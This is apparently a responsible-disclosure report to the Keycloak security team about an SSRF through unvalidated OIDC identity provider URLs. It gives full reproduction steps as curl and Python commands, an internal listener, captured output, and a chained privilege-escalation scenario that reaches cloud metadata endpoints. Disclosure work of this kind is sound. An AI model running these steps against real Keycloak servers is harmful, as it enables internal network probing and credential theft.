Hi Keycloak Security Team,

I am reporting a Server-Side Request Forgery (SSRF) vulnerability in
Keycloak that allows an administrator (or a lower-privileged user via
a separate privilege escalation vulnerability reported previously) to
force the Keycloak server to make HTTP requests to arbitrary internal
endpoints via the OIDC Identity Provider tokenUrl and userInfoUrl
configuration.

Affected Version: Latest main branch (commit 3c07b879d5cfaf277caa5d4bc96174347f71f91c)
Tested on: Keycloak 999.0.0-SNAPSHOT built from source

AI Disclosure: AI tools were used to assist in drafting this report. The
vulnerability was manually discovered, verified, and reproduced.

DESCRIPTION:
When creating an OIDC Identity Provider, the tokenUrl, userInfoUrl, and
authorizationUrl fields accept any URL including internal/private network
addresses. When the broker authentication flow is triggered, Keycloak's
server sends POST requests to tokenUrl and GET requests to userInfoUrl,
allowing an attacker to reach internal services and in cloud environments
access instance metadata endpoints.

ROOT CAUSE:
No validation or allowlist is applied to the IdP URL fields (tokenUrl,
userInfoUrl, authorizationUrl) before Keycloak's server-side HTTP client
uses them. Any URL including RFC 1918 addresses, loopback, link-local,
and cloud metadata endpoints is accepted.

CHAINED ATTACK SCENARIO:
When combined with the Composite Role Escalation vulnerability I reported
separately, a user with only manage-users permission can:
1. Self-assign a composite role to gain manage-identity-providers
2. Create an OIDC IdP with tokenUrl/userInfoUrl pointing to internal targets
3. Trigger the broker flow to force Keycloak to make server-side requests

This chain elevates the SSRF from requiring admin access (Medium) to
being exploitable by any user with manage-users (High).

REPRODUCTION STEPS:

1. Start Keycloak in dev mode on port 8084

2. Get admin token:

KC=http://localhost:8084
tok() {
  curl -s $KC/realms/master/protocol/openid-connect/token \
    -d client_id=admin-cli -d username=admin -d password=admin \
    -d grant_type=password \
    | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])'
}
T=$(tok)

3. Start a listener on port 9999 (simulating an internal service):

python3 -c '
import http.server, json
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"GET from Keycloak: {self.path}")
        self.send_response(200)
        self.send_header("Content-Type","application/json")
        self.end_headers()
        self.wfile.write(json.dumps({"sub":"user"}).encode())
    def do_POST(self):
        length = int(self.headers.get("Content-Length",0))
        body = self.rfile.read(length).decode()
        print(f"POST from Keycloak: {self.path}")
        print(f"Body: {body[:200]}")
        self.send_response(200)
        self.send_header("Content-Type","application/json")
        self.end_headers()
        self.wfile.write(json.dumps({"access_token":"fake","token_type":"bearer","id_token":"eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1c2VyIn0."}).encode())
http.server.HTTPServer(("0.0.0.0",9999),H).serve_forever()
'

4. Create an OIDC IdP with internal URLs:

T=$(tok)
curl -s -X POST $KC/admin/realms/master/identity-provider/instances \
  -H "Authorization: Bearer $T" \
  -H 'Content-Type: application/json' \
  -d '{
    "alias":"ssrf-idp2",
    "providerId":"oidc",
    "enabled":true,
    "config":{
      "authorizationUrl":"http://127.0.0.1:9999/auth",
      "tokenUrl":"http://127.0.0.1:9999/token",
      "userInfoUrl":"http://127.0.0.1:9999/userinfo",
      "clientId":"fake",
      "clientSecret":"fake",
      "validateSignature":"false",
      "disableUserInfoService":"false"
    }
  }'

5. Trigger the broker flow with PKCE:

VERIFIER=$(openssl rand -base64 96 | tr -d '=+/' | head -c 128)
CHALLENGE=$(echo -n $VERIFIER | openssl dgst -sha256 -binary | openssl base64 -A | tr '+/' '-_' | tr -d '=')

RESP=$(curl -s -D- -o /dev/null \
  "$KC/realms/master/protocol/openid-connect/auth?client_id=account-console&response_type=code&scope=openid&redirect_uri=$KC/realms/master/account&kc_idp_hint=ssrf-idp2&code_challenge=$CHALLENGE&code_challenge_method=S256" \
  -c /tmp/ssrf-cookies)

BROKER_URL=$(echo "$RESP" | grep -i "^location:" | sed 's/Location: //')

RESP2=$(curl -s -D- -o /dev/null -b /tmp/ssrf-cookies -c /tmp/ssrf-cookies "$BROKER_URL")

STATE=$(echo "$RESP2" | grep -i "^location:" | grep -oP 'state=\K[^&\s]+')

6. Send fake callback to trigger SSRF:

curl -s -b /tmp/ssrf-cookies -c /tmp/ssrf-cookies \
  "$KC/realms/master/broker/ssrf-idp2/endpoint?code=fakecode&state=$STATE"

7. The listener receives requests from Keycloak:

[!] POST from Keycloak!
    Path: /token
    Body: code=fakecode&grant_type=authorization_code&redirect_uri=...&client_secret=fake&client_id=fake

IMPACT:
- Keycloak server makes POST requests to attacker-controlled internal URLs
  with OAuth parameters in the body
- Internal network service discovery and port scanning
- Cloud metadata theft via http://169.254.169.254/
- When chained with composite role escalation: exploitable by any user
  with manage-users permission

CVSS 3.1 (standalone): 4.1 (Medium)
Vector: AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:N/A:N

CVSS 3.1 (chained with privilege escalation): 8.1 (High)
Vector: AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N

